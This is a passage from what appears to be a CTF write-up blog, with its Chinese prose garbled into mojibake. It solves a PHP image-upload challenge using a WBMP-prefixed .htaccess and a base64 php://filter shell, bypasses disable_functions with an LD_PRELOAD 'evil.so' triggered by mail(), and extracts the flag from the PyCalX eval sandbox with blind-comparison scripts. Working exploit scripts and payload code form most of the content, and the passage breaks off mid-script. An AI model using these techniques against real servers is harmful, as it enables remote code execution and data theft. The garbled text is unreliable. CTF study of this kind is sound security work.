(count($parts) === 0) &#123; die(&quot;lol filename is empty&quot;); &#125; if (in_array($ext, $disallowed_ext, TRUE)) &#123; die(&quot;lol nice try, but im not stupid dude...&quot;); &#125; $image = file_get_contents($tmp_name); if (mb_strpos($image, &quot;&lt;?&quot;) !== FALSE) &#123; die(&quot;why would you need php in a pic.....&quot;); &#125; if (!exif_imagetype($tmp_name)) &#123; die(&quot;not an image.&quot;); &#125; $image_size = getimagesize($tmp_name); if ($image_size[0] !== 1337 || $image_size[1] !== 1337) &#123; die(&quot;lol noob, your pic is not l33t enough&quot;); &#125; $name = implode(&quot;.&quot;, $parts); move_uploaded_file($tmp_name, $userdir . $name . &quot;.&quot; . $ext);&#125;echo &quot;&lt;h3&gt;Your &lt;a href=$userdir&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;&quot;;foreach(glob($userdir . &quot;*&quot;) as $file) &#123; echo &quot;&lt;li&gt;&lt;a href=&#x27;$file&#x27;&gt;$file&lt;/a&gt;&lt;/li&gt;&quot;;&#125;echo &quot;&lt;/ul&gt;&quot;;?&gt;&lt;h1&gt;Upload your pics!&lt;/h1&gt;&lt;form method=&quot;POST&quot; action=&quot;?&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;image&quot;&gt; &lt;input type=&quot;submit&quot; name=upload&gt;&lt;/form&gt;&lt;!-- /?source --&gt; æ‘†æ˜äº†å°±æ˜¯è¦ä¸Šä¼  PHP æ–‡ä»¶äº†ã€‚ä¸Šä¼ çš„æ–‡ä»¶éƒ½ä¼šåœ¨ images / éšæœºç›®å½• é‡Œå­˜æ”¾ï¼Œå…¶ä¸­ç»™äº†æˆ‘ä»¬å¦‚ä¸‹é™åˆ¶æ¡ä»¶ï¼š ä¸Šä¼ çš„æ–‡ä»¶ååç¼€ä¸èƒ½æ˜¯å¦‚ä¸‹ä¹‹ä¸€ï¼š â€œphpâ€,â€php3â€,â€php4â€,â€php5â€,â€php7â€,â€phtâ€,â€phtmâ€,â€phtmlâ€,â€pharâ€,â€phpsâ€ï¼› ä¸Šä¼ çš„æ–‡ä»¶ä¸èƒ½å‡ºç°â€&lt;?â€œï¼› ä¸Šä¼ çš„æ–‡ä»¶å¾—æ˜¯ä¸€ä¸ªåˆæ³•çš„å›¾ç‰‡æ–‡ä»¶ï¼Œè¿˜çš„æ˜¯ 1337*1337 è§„æ ¼çš„ã€‚ ç¬¬ä¸€æ¡æŠŠ PHP å¼•æ“é»˜è®¤å¤„ç†çš„åç¼€å…¨å¤„ç†æ‰äº†ï¼Œç¬¬äºŒæ¡è§„åˆ™åœ¨ PHP7 ä¹‹å‰è¿˜æ˜¯å¯ä»¥ç”¨ &lt;script language='php'&gt;&lt;/sciprt&gt; ç»•çš„ï¼Œä½†æ˜¯è¿™ä¸ª PHP7 é‡ŒåºŸé™¤äº†ï¼Œç¬¬ä¸‰æ¡å€’æ˜¯å¥½åŠï¼Œæ‰¾å¼  1337*1337 å°ºå¯¸çš„å›¾ç‰‡å°±å¥½åŠã€‚ è¿™ä¸ªæ—¶å€™ï¼Œä¸ºäº†çªç ´ç¬¬ä¸€æ¡é™åˆ¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ ä¸€ä¸ª.htaccess æ–‡ä»¶äº†ï¼Œåœ¨å¼€å¯äº† AllowOverride ä¸‹ï¼Œ.htaccess æ–‡ä»¶å¯ä»¥ä¿®æ”¹ PHP èƒ½è§£æçš„æ–‡ä»¶åç¼€ã€‚ä½†æ˜¯ï¼Œä¸Šä¼ .htaccess æ–‡ä»¶éœ€è¦å°†å®é™…å†…å®¹æ”¾åœ¨ä¸€ä¸ªæ­£å¸¸å›¾ç‰‡åé¢ã€‚è€Œæ­£å¸¸çš„ 1337*1337 å¤§å°çš„å›¾ç‰‡é‡Œè‚¯å®šä¼šå‡ºç°å¤§é‡æ— æ³•æ­£å¸¸è§£æçš„å†…å®¹ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ç§èƒ½å¤Ÿå°½é‡çŸ­å°ç²¾æ‚çš„å›¾ç‰‡æ ¼å¼ã€‚ç¿»äº†ä¸€ä¸‹ exif_imagetype() çš„æ–‡æ¡£ï¼Œå‘ç° wbmp æ ¼å¼çš„æ–‡ä»¶ä¼¼ä¹èƒ½å¤Ÿæ»¡è¶³è¦æ±‚ï¼Œå®ƒçš„å¼€å¤´æ˜¯ ï¼Œä¸å½±å“.htaccess æ–‡ä»¶è§£æã€‚è€Œä¸ºäº†å°†å›¾ç‰‡æ–‡ä»¶å½±å“åˆ°æœ€å°ï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œå‹ç¼©ã€‚ 1234567891011121314151617181920 &lt;?phperror_reporting(0);$contents = file_get_contents(&quot;../original.wbmp&quot;); //original,wbmpå°±æ˜¯ä¸€ä¸ªéå¸¸å°çš„æ­£å¸¸wbmpæ–‡ä»¶$i = 0;while (true) &#123; $truncated = substr($contents, 0, $i); file_put_contents(&quot;truncated.wbmp&quot;, $truncated); if (exif_imagetype(&quot;truncated.wbmp&quot;)) break; $i += 1;&#125;echo &quot;Shortest file size : $i\\n&quot;;var_dump(exif_imagetype(&quot;truncated.wbmp&quot;));var_dump(getimagesize(&quot;truncated.wbmp&quot;));?&gt; ä»æ–‡ä»¶æœ«åå¾€å‰ç¼©å°ç›´åˆ°æ–‡ä»¶ä¸å†åˆæ³•ä¸ºæ­¢ï¼Œæœ€åæˆ‘ä»¬å¾—åˆ°ä¸€ä¸ª 6 å­—èŠ‚çš„ wbmp æ–‡ä»¶ã€‚ä¸ºäº†æ»¡è¶³ 1337*1337 çš„å¤§å°è¦æ±‚ï¼ŒæŠŠå®ƒæ‹–è¿› 010Editor é‡Œæ”¹ï¼Œæœ€åå¾—åˆ°æ­£ç¡®çš„æ–‡ä»¶ã€‚ å°è¯•ä¸Šä¼ ï¼Œæœç„¶æ²¡å•¥å¤§é—®é¢˜äº†ã€‚æ³¨æ„ä¸€ç‚¹ï¼Œæºç  39-41 è¡Œçš„æ“ä½œï¼Œå¦‚æœåœ¨ aaa.bbb æ–‡ä»¶åä¸­ aaa ä¸å­˜åœ¨ï¼Œå°±ä¼šå°†.bbb å‰ç§»ä¸€ä½ï¼Œå› æ­¤éœ€è¦ä¸¤ä¸ª.ã€‚ ä¸‹é¢è€ƒè™‘.htaccess æ–‡ä»¶éœ€è¦äº›ä»€ä¹ˆå†…å®¹ã€‚å‚è€ƒå…¶ä»–.htaccess getshell çš„æ–‡ç« ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ AddType x-httpd-php .tiaonmmn è¿™ç§è‡ªå®šä¹‰åç¼€åæ¥å¼ºè¡Œä½¿ç”¨ PHP è§£é‡Šå™¨ï¼Œä½†æ˜¯ç¬¬äºŒæ¡é™åˆ¶æˆ‘ä»¬ä»ç„¶è¿‡ä¸å»ï¼Œä¸èƒ½å‡ºç° â€œ&lt;?â€ã€‚åæ¥çŸ¥é“äº†ï¼ŒApache2 é…ç½®æ–‡ä»¶é‡Œå¯ä»¥ç”¨ php_value æ¥è¦†ç›– php.ini çš„è®¾ç½®ï¼Œè€Œ php.ini çš„è®¾ç½®é‡Œæœ‰ä¸€æ¡æ¯”è¾ƒæœ‰è¶£çš„æ¡ç›®ï¼šauto_append_fileï¼Œç”¨æ¥åœ¨æ‰€æœ‰ PHP æ–‡ä»¶å‰å…ˆè¡Œ include ä¸€ä¸ªæ–‡ä»¶ï¼Œä»¥åŠæœ€é‡è¦çš„ä¸€ç‚¹ï¼šauto_append_file å¯ä»¥ä½¿ç”¨ PHP æµã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªç”¨æ¥å†™å…¥ shellï¼Œè€Œå¦ä¸€ä¸ªç”¨æ¥è§¦å‘ shellã€‚è€Œå†™å…¥çš„ shell ä½¿ç”¨ base64 ç¼–ç ï¼Œåœ¨.htaccess ä¸­è®¾ç½® php_value ä¸º auto_append_file php://filter/convert.base64-decode/resource=â€shell æ–‡ä»¶åâ€.tiaonmmnï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡ &lt;? çš„é™åˆ¶ã€‚ ä¸ºäº†æ–¹ä¾¿èµ·è§ï¼Œæˆ‘ä»¬ç”¨ä¸€ä¸ª Python è„šæœ¬ç®€åŒ–ä¸€ä¸‹æ­¥éª¤ï¼š 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/env python3import requestsimport base64VALID_WBMP = b&quot;\\x00\\x00\\x8a\\x39\\x8a\\x39\\x0a&quot;URL = &quot;http://xxx.yyy.zzz.www/&quot;RANDOM_DIRECTORY = &quot;ad759ad95e5482e02a15c5d30042b588b6630e64&quot;COOKIES = &#123; &quot;PHPSESSID&quot; : &quot;0e7eal0ji7seg6ac3ck7d2csd8&quot;&#125;def upload_content(name, content): data = &#123; &quot;image&quot; : (name, content, &#x27;image/png&#x27;), &quot;upload&quot; : (None, &quot;Submit Query&quot;, None) &#125; response = requests.post(URL, files=data, cookies=COOKIES)HT_ACCESS = VALID_WBMP + b&quot;&quot;&quot;AddType application/x-httpd-php .corb3nikphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.corb3nik&quot;&quot;&quot;&quot;TARGET_FILE = VALID_WBMP + b&quot;AA&quot; + base64.b64encode(b&quot;&quot;&quot;&lt;?php var_dump(&quot;works&quot;);?&gt;&quot;&quot;&quot;)upload_content(&quot;..htaccess&quot;, HT_ACCESS)upload_content(&quot;shell.corb3nik&quot;, TARGET_FILE)upload_content(&quot;trigger.corb3nik&quot;, VALID_WBMP)response = requests.post(URL + &quot;/images/&quot; + RANDOM_DIRECTORY + &quot;/trigger.corb3nik&quot;)print(response.text) æ”¹ TARGET_FILE ä¸­çš„ php ä»£ç å³å¯ä»»æ„æ‰§è¡Œã€‚ Part 2. ç»•è¿‡ disable_functions æ‰§è¡Œä¸€ä¸‹ phpinfo ()ï¼Œå‘ç°èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°åŸºæœ¬éƒ½è¢«ç¦ç”¨äº†ã€‚ç„¶ååˆ—äº†ä¸€ä¸‹ç›®å½•ï¼Œå‘ç°æ ¹ç›®å½•ä¸‹æœ‰ä¸€ä¸ª flag æ–‡ä»¶å’Œä¸€ä¸ª get_flag ç¨‹åºï¼Œæ˜¾ç„¶ flag æ–‡ä»¶éœ€è¦ get_flag å‘½ä»¤å»è¯»ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ä»”ç»†è§‚å¯Ÿ disable_functionsï¼Œputenv æ²¡æœ‰è¢«ç¦ç”¨ã€‚ç›®æ ‡å¾ˆæ˜ç¡®äº†ï¼šå†™ä¸€ä¸ª so åº“ï¼Œåˆ©ç”¨ mail å‡½æ•°ä½¿ç”¨ LD_PRELOAD å˜é‡ç»•è¿‡ disable_functionsã€‚ 123456789101112131415161718192021/* compile: gcc -Wall -fPIC -shared -o evil.so evil.c -ldl */#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload(char *cmd) &#123; char buf[512]; strcpy(buf, cmd); strcat(buf, &quot; &gt; /tmp/_0utput.txt&quot;); system(buf);&#125;int getuid() &#123; char *cmd; if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123; return 0; &#125; unsetenv(&quot;LD_PRELOAD&quot;); if ((cmd = getenv(&quot;_evilcmd&quot;)) != NULL) &#123; payload(cmd); &#125; return 1;&#125; ä¸Šè¿°ä»£ç å°†ä»ç¯å¢ƒå˜é‡_evilcmd ä¸­æ‰§è¡Œå‘½ä»¤ï¼Œç»“æœé‡å®šå‘åˆ° /tmp/_0utput.txt ä¸­ï¼Œé‚£ä¹ˆ shell.tiaonmmn éœ€è¦å®Œæˆçš„å°±æ˜¯ putenv LD_PRELOAD å’Œ_evilcmdï¼Œè°ƒç”¨ mail () å‡½æ•°ï¼Œæœ€åè¯» /tmp/_0utput.txt æ–‡ä»¶ã€‚æˆ‘ä»¬çš„ Python è„šæœ¬è¦æ›´æ–°ä¸€ä¸‹äº†ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env python3import requestsimport base64VALID_WBMP = b&quot;\\x00\\x00\\x8a\\x39\\x8a\\x39\\x0a&quot;URL = &quot;http://35.246.234.136/&quot;RANDOM_DIRECTORY = &quot;ad759ad95e5482e02a15c5d30042b588b6630e64&quot;COOKIES = &#123; &quot;PHPSESSID&quot; : &quot;0e7eal0ji7seg6ac3ck7d2csd8&quot;&#125;def upload_content(name, content): data = &#123; &quot;image&quot; : (name, content, &#x27;image/png&#x27;), &quot;upload&quot; : (None, &quot;Submit Query&quot;, None) &#125; response = requests.post(URL, files=data, cookies=COOKIES)HT_ACCESS = VALID_WBMP + b&quot;&quot;&quot;AddType application/x-httpd-php .corb3nikphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.corb3nik&quot;&quot;&quot;&quot;TARGET_FILE = VALID_WBMP + b&quot;AA&quot; + base64.b64encode(b&quot;&quot;&quot;&lt;?phpmove_uploaded_file($_FILES[&#x27;evil&#x27;][&#x27;tmp_name&#x27;], &#x27;/tmp/evil.so&#x27;);putenv(&#x27;LD_PRELOAD=/tmp/evil.so&#x27;);putenv(&quot;_evilcmd=uname -a&quot;);mail(&#x27;a&#x27;,&#x27;a&#x27;,&#x27;a&#x27;);echo file_get_contents(&#x27;/tmp/_0utput.txt&#x27;);?&gt;&quot;&quot;&quot;)upload_content(&quot;..htaccess&quot;, HT_ACCESS)upload_content(&quot;shell.corb3nik&quot;, TARGET_FILE)upload_content(&quot;trigger.corb3nik&quot;, VALID_WBMP)files = &#123; &quot;evil&quot; : open(&quot;../payloads/evil.so&quot;, &quot;rb&quot;) &#125;response = requests.post(URL + &quot;/images/&quot; + RANDOM_DIRECTORY + &quot;/trigger.corb3nik&quot;, files=files)print(response.text) æˆ‘ä»¬å°è¯•æ‰§è¡Œä¸€ä¸‹ get_flag å‘½ä»¤ï¼š å•Šï¼Œçœ‹æ¥è¿˜æ²¡æœ‰ç»“æŸã€‚ Part 3. Get the f**king flag æŠŠ get_flag ä¸‹è½½åˆ°æœ¬åœ°ï¼ŒIDA åˆ†æå‘ç°è¿™ä¸ªç¨‹åºéšæœºç”Ÿæˆæ•°å­—ï¼Œè¦æ±‚åœ¨ 1s å†…ç»™å‡ºç­”æ¡ˆï¼Œå¦åˆ™ç¨‹åºé€€å‡ºã€‚é‚£ä¹ˆï¼ŒåŒæ ·çš„æ€è·¯ï¼Œä¸è¿‡ so åº“æ–‡ä»¶è¦å®Œæˆä¸€ç³»åˆ—çš„æ“ä½œäº†ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;signal.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/prctl.h&gt;int main() &#123; pid_t pid = 0; int inpipefd[2]; int outpipefd[2]; pipe(inpipefd); pipe(outpipefd); pid = fork(); if (pid == 0) &#123; dup2(outpipefd[0], STDIN_FILENO); dup2(inpipefd[1], STDOUT_FILENO); dup2(inpipefd[1], STDERR_FILENO); prctl(PR_SET_PDEATHSIG, SIGTERM); execl(&quot;/get_flag&quot;, &quot;get_flag&quot;, (char*) NULL); exit(1); &#125; close(outpipefd[0]); close(inpipefd[1]); char data[0xff] = &#123;0&#125;; // Read first line for (; data[0] != &#x27;\\n&#x27;; read(inpipefd[0], data, 1)); // Read captcha read(inpipefd[0], data, 0xff); uint64_t sum = 0; char *pch; printf(&quot;Raw : %s\\n&quot;, data); pch = strtok (data, &quot;+&quot;); printf(&quot;Sum : %lu\\n&quot;, sum); while (pch != 0) &#123; sum += strtoull(pch, 0, 10); printf(&quot;Operand : %lu\\n&quot;, atol(pch)); printf(&quot;Sum : %lu\\n&quot;, sum); pch = strtok (0, &quot;+&quot;); &#125; char result[32] = &#123;0&#125;; sprintf(result, &quot;%lu\\n&quot;, sum); printf(&quot;Result : %lu\\n&quot;, sum); write(outpipefd[1], result, 16); memset(data, 0, 0xff); read(inpipefd[0], data, 0xff); printf(&quot;Final : %s&quot;, data);&#125; å°†æ–‡ä»¶ç¼–è¯‘å®Œï¼Œä¸Šä¼ ï¼Œ_evilcmd æ‰§è¡Œåï¼Œå¾—åˆ°ç»“æœã€‚æœ€ç»ˆå¾—åˆ° flagã€‚ flag{67901b58-bd98-4494-b502-df1434c9a6ba}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Upload","slug":"Upload","permalink":"http://tiaonmmn.github.io/tags/Upload/"},{"name":"LD_PRELOAD","slug":"LD-PRELOAD","permalink":"http://tiaonmmn.github.io/tags/LD-PRELOAD/"},{"name":"disable_functions","slug":"disable-functions","permalink":"http://tiaonmmn.github.io/tags/disable-functions/"}]},{"title":"MeePwn2018-PyCalX 1-2","slug":"MeePwn2018-PyCalX-1-2","date":"2019-05-15T07:08:11.000Z","updated":"2020-03-05T07:20:52.239Z","comments":true,"path":"2019/05/15/MeePwn2018-PyCalX-1-2/","link":"","permalink":"http://tiaonmmn.github.io/2019/05/15/MeePwn2018-PyCalX-1-2/","excerpt":"ä¸€é“ Python çš„é¢˜ï¼Œç»•æ²™ç›’çš„ã€‚ç¯å¢ƒåœ¨è¿™ã€‚ Part 1. PyCalX-Version1 é¢˜ç›®ç»™äº†æºç ã€‚","text":"ä¸€é“ Python çš„é¢˜ï¼Œç»•æ²™ç›’çš„ã€‚ç¯å¢ƒåœ¨è¿™ã€‚ Part 1. PyCalX-Version1 é¢˜ç›®ç»™äº†æºç ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!/usr/bin/env python3import cgi;import sysfrom html import escapeFLAG = open(&#x27;/var/www/flag&#x27;,&#x27;r&#x27;).read()OK_200 = &quot;&quot;&quot;Content-type: text/html&lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;&lt;center&gt;&lt;title&gt;PyCalx&lt;/title&gt;&lt;h1&gt;PyCalx&lt;/h1&gt;&lt;form&gt;&lt;input class=&quot;form-control col-md-4&quot; type=text name=value1 placeholder=&#x27;Value 1 (Example: 1 abc)&#x27; autofocus/&gt;&lt;input class=&quot;form-control col-md-4&quot; type=text name=op placeholder=&#x27;Operator (Example: + - * ** / // == != )&#x27; /&gt;&lt;input class=&quot;form-control col-md-4&quot; type=text name=value2 placeholder=&#x27;Value 2 (Example: 1 abc)&#x27; /&gt;&lt;input class=&quot;form-control col-md-4 btn btn-success&quot; type=submit value=EVAL /&gt;&lt;/form&gt;&lt;a href=&#x27;?source=1&#x27;&gt;Source&lt;/a&gt;&lt;/center&gt;&quot;&quot;&quot;print(OK_200)arguments = cgi.FieldStorage()if &#x27;source&#x27; in arguments: source = arguments[&#x27;source&#x27;].valueelse: source = 0if source == &#x27;1&#x27;: print(&#x27;&lt;pre&gt;&#x27;+escape(str(open(__file__,&#x27;r&#x27;).read()))+&#x27;&lt;/pre&gt;&#x27;)if &#x27;value1&#x27; in arguments and &#x27;value2&#x27; in arguments and &#x27;op&#x27; in arguments: def get_value(val): val = str(val)[:64] if str(val).isdigit(): return int(val) blacklist = [&#x27;(&#x27;,&#x27;)&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;\\&#x27;&#x27;,&#x27;&quot;&#x27;] # I don&#x27;t like tuple, list and dict. if val == &#x27;&#x27; or [c for c in blacklist if c in val] != []: print(&#x27;&lt;center&gt;Invalid value %s&lt;/center&gt;&#x27;%val) sys.exit(0) return val def get_op(val): val = str(val)[:2] list_ops = [&#x27;+&#x27;,&#x27;-&#x27;,&#x27;/&#x27;,&#x27;*&#x27;,&#x27;=&#x27;,&#x27;!&#x27;] if val == &#x27;&#x27; or val[0] not in list_ops: print(&#x27;&lt;center&gt;Invalid op&lt;/center&gt;&#x27;) sys.exit(0) return val op = get_op(arguments[&#x27;op&#x27;].value) value1 = get_value(arguments[&#x27;value1&#x27;].value) value2 = get_value(arguments[&#x27;value2&#x27;].value) if str(value1).isdigit() ^ str(value2).isdigit(): print(&#x27;&lt;center&gt;Types of the values don\\&#x27;t match&lt;/center&gt;&#x27;) sys.exit(0) calc_eval = str(repr(value1)) + str(op) + str(repr(value2)) print(&#x27;&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class=&quot;col-md-8&quot;&gt;&lt;pre&gt;&#x27;) print(&#x27;&gt;&gt;&gt;&gt; print(&#x27;+escape(calc_eval)+&#x27;)&#x27;) try: result = str(eval(calc_eval)) if result.isdigit() or result == &#x27;True&#x27; or result == &#x27;False&#x27;: print(result) else: print(&quot;Invalid&quot;) # Sorry we don&#x27;t support output as a string due to security issue. except: print(&quot;Invalid&quot;) print(&#x27;&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&#x27;) å°±æ˜¯ç”¨ eval å®ç°äº†ä¸ªç®€æ˜“è®¡ç®—å™¨ï¼Œè€Œ FLAG å·²ç»è¯»è¿›ç¨‹åºäº†ï¼Œæš‚æ—¶ä¸æƒ³ç»•æ²™ç›’ getshell çš„äº‹æƒ…ã€‚ä¸¤ä¸ªå€¼è¦æ±‚ä¸èƒ½å‡ºç°â€ã€â€™ã€[ã€]ã€(ã€) è¿™äº›ç¬¦å·ï¼Œè€Œä¸­é—´çš„è¿ç®—ç¬¦è¦æ±‚å¿…é¡»æ˜¯ + - * / ! = è¿™å‡ ä¸ªï¼Œä½†æ˜¯è¯·æ³¨æ„æºç  50 è¡Œï¼Œå®ƒä½¿ç”¨çš„æ˜¯ op [0]ï¼Œåé¢çš„æ²¡åšä»»ä½•é™åˆ¶ï¼Œå› æ­¤å¯ä»¥å‡ºç° +'' è¿™ç§ç¬¦å·ã€‚è€Œç¨‹åºå…è®¸æˆ‘ä»¬ä½¿ç”¨å­—ç¬¦ä¸²è¿ç®—ï¼Œä½†æ˜¯æ²¡æ³•ç›´æ¥è¿”å›ç»“æœã€‚å› æ­¤æ€è·¯éå¸¸æ˜ç¡®äº†ï¼šé€šè¿‡ç±»ä¼¼ç›²æ³¨çš„æ–¹å¼ï¼Œé€ä½åˆ¤æ–­ FLAGã€‚ä½†æ˜¯æˆ‘ä»¬éœ€è¦ä¸€ä¸ªç¬¬ä¸‰æ–¹èƒ½æ§åˆ¶çš„å˜é‡ï¼Œvalue1 æ²¡æ³•çœŸæ­£å‚ä¸è¿ç®—ã€‚è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å‘ç°è¿˜æœ‰ä¸€ä¸ª source å˜é‡ï¼Œè™½ç„¶æ˜¯ç”¨æ¥æ˜¾ç¤ºæºç çš„ï¼Œä½†æ˜¯å®ƒçš„ä½œç”¨åŸŸæ˜¯å…¨å±€ï¼Œå¯ä»¥å‚ä¸è¿ç®—ï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶ã€‚é‚£ä¹ˆå¯ä»¥å¼€å§‹å†™è„šæœ¬äº†ã€‚ 123456789101112131415161718192021222324import requestsimport urllibimport stringurl=&quot;http://192.168.60.130/cgi-bin/py.py?source=&#123;0&#125;&amp;value1=&#123;1&#125;&amp;op=&#123;2&#125;&amp;value2=&#123;3&#125;&quot;flag=&quot;&quot;source=&quot;&quot;value1=urllib.parse.quote(&quot;WQERGFD&quot;)op=urllib.parse.quote(&quot;+&#x27;&quot;)value2=urllib.parse.quote(&quot; and FLAG&gt;source#&quot;)while True: prev = 0 for i in range(255): if chr(i) in string.printable: source=flag+chr(prev) source=urllib.parse.quote(source) result=requests.get(url.format(source,value1,op,value2)).text #print(result) if &quot;False&quot; in result and &quot;security&quot; not in result: flag+=chr(prev-1) print(flag) break else: prev=i Python æ¯”è¾ƒå­—ç¬¦ä¸²å¤§å°çš„æ—¶å€™ï¼Œé€ä½åˆ¤æ–­ï¼Œç¬¬ä¸€ä½ç›¸åŒæ—¶æ¯”è¾ƒä¸‹ä¸€ä½ã€‚å› æ­¤æˆ‘ä»¬ä¸éœ€è¦ [1] è¿™ç§æŒ‡ç¤ºä½æ•°ã€‚ Part 2. PyCalX-Version2 ç¬¬ä¸€ä¸ªç‰ˆæœ¬çš„ PyCalX ç”±äº op æ²¡æœ‰ä»”ç»†åˆ¤æ–­ï¼Œç¬¬äºŒä¸ªç‰ˆæœ¬çš„å°±æ”¹è¿‡æ¥äº†ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879 #!/usr/bin/env python3import cgi;import sysfrom html import escapeFLAG = open(&#x27;/var/www/flag&#x27;,&#x27;r&#x27;).read()OK_200 = &quot;&quot;&quot;Content-type: text/html&lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;&lt;center&gt;&lt;title&gt;PyCalx&lt;/title&gt;&lt;h1&gt;PyCalx&lt;/h1&gt;&lt;form&gt;&lt;input class=&quot;form-control col-md-4&quot; type=text name=value1 placeholder=&#x27;Value 1 (Example: 1 abc)&#x27; autofocus/&gt;&lt;input class=&quot;form-control col-md-4&quot; type=text name=op placeholder=&#x27;Operator (Example: + - * ** / // == != )&#x27; /&gt;&lt;input class=&quot;form-control col-md-4&quot; type=text name=value2 placeholder=&#x27;Value 2 (Example: 1 abc)&#x27; /&gt;&lt;input class=&quot;form-control col-md-4 btn btn-success&quot; type=submit value=EVAL /&gt;&lt;/form&gt;&lt;a href=&#x27;?source=1&#x27;&gt;Source&lt;/a&gt;&lt;/center&gt;&quot;&quot;&quot;print(OK_200)arguments = cgi.FieldStorage()if &#x27;source&#x27; in arguments: source = arguments[&#x27;source&#x27;].valueelse: source = 0if source == &#x27;1&#x27;: print(&#x27;&lt;pre&gt;&#x27;+escape(str(open(__file__,&#x27;r&#x27;).read()))+&#x27;&lt;/pre&gt;&#x27;)if &#x27;value1&#x27; in arguments and &#x27;value2&#x27; in arguments and &#x27;op&#x27; in arguments: def get_value(val): val = str(val)[:64] if str(val).isdigit(): return int(val) blacklist = [&#x27;(&#x27;,&#x27;)&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;\\&#x27;&#x27;,&#x27;&quot;&#x27;] # I don&#x27;t like tuple, list and dict. if val == &#x27;&#x27; or [c for c in blacklist if c in val] != []: print(&#x27;&lt;center&gt;Invalid value&lt;/center&gt;&#x27;) sys.exit(0) return val def get_op(val): val = str(val)[:2] list_ops = [&#x27;+&#x27;,&#x27;-&#x27;,&#x27;/&#x27;,&#x27;*&#x27;,&#x27;=&#x27;,&#x27;!&#x27;] if val == &#x27;&#x27; or val[0] not in list_ops: print(&#x27;&lt;center&gt;Invalid op&lt;/center&gt;&#x27;) sys.exit(0) return val op = get_op(get_value(arguments[&#x27;op&#x27;].value)) value1 = get_value(arguments[&#x27;value1&#x27;].value) value2 = get_value(arguments[&#x27;value2&#x27;].value) if str(value1).isdigit() ^ str(value2).isdigit(): print(&#x27;&lt;center&gt;Types of the values don\\&#x27;t match&lt;/center&gt;&#x27;) sys.exit(0) calc_eval = str(repr(value1)) + str(op) + str(repr(value2)) print(&#x27;&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class=&quot;col-md-8&quot;&gt;&lt;pre&gt;&#x27;) print(&#x27;&gt;&gt;&gt;&gt; print(&#x27;+escape(calc_eval)+&#x27;)&#x27;) try: result = str(eval(calc_eval)) if result.isdigit() or result == &#x27;True&#x27; or result == &#x27;False&#x27;: print(result) else: print(&quot;Invalid&quot;) # Sorry we don&#x27;t support output as a string due to security issue. except: print(&quot;Invalid&quot;) print(&#x27;&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&#x27;) op ä¹Ÿä¼šè¢« blacklist è¿‡æ»¤ä¸€éï¼Œä¸èƒ½ä½¿ç”¨â€™äº†ï¼Œç›®å‰ä¹Ÿæ²¡æœ‰ä»€ä¹ˆå¥½ç”¨çš„æ–¹æ³•ç»§ç»­ç»•è¿‡äº†ã€‚æ³¨æ„åˆ°ä¸€ä»¶äº‹ï¼Œé¢˜ç›®ç”¨çš„ Python ç‰ˆæœ¬ä¸º Python3ï¼Œä¼šä¸ä¼šæœ‰ä»€ä¹ˆç‰¹åˆ«çš„åŠŸèƒ½äº†ï¼Ÿç¡®å®æœ‰ï¼Œf-stringã€‚f-string é‡Œå¯ä»¥å¼•å…¥åˆ¤æ–­ï¼Œæ‰€ä»¥æ€è·¯è¦æ¢ä¸€ä¸‹ï¼šTru é€šè¿‡ value1 è¾“å‡ºï¼Œè€Œ e é€šè¿‡æ¡ä»¶åˆ¤æ–­ã€‚å°±æ˜¯è¦æ„é€  fâ€™{FLAG&gt;source or â€œeâ€ }â€™ï¼Œå½“ FLAG&gt;source æ—¶è¾“å‡º 1ï¼Œå¦åˆ™è¾“å‡º eã€‚é‚£ä¹ˆè„šæœ¬å°±å¾ˆå¥½å†™äº†ï¼Œç¨å¾®æ”¹ä¸€ä¸‹ï¼š 123456789101112131415161718192021222324import requestsimport urllibimport 